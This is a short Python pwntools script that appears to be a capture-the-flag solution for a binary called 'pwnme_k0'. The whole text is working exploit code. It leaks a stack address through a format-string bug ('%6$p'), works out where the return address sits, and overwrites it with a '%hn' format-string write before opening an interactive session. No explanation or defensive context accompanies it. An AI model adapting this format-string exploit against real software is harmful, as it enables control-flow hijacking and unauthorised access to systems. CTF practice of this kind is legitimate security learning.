from pwn import *

context.log_level = 'debug'
p = process('./pwnme_k0')

p.recvuntil('Input your username(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('Input your password(max lenth:20):')
p.sendline('a'*8)
p.recvuntil('>')
p.sendline('1')

rbp_new = int(p.recv(14),16)
# ~ print 'data: ' + hex(data)

ret_addr = rbp_new - 0x38
payload = '%2214d%12$hn'
payload += p64(ret_addr)  

p.recvuntil('>')
p.sendline('2')
p.recvuntil('please input new username(max lenth:20):')
p.sendline('b'*8)
p.recvuntil('please input new password(max lenth:20):')
p.send(payload)

p.recvuntil('>')
p.sendline('1')
p.interactive()
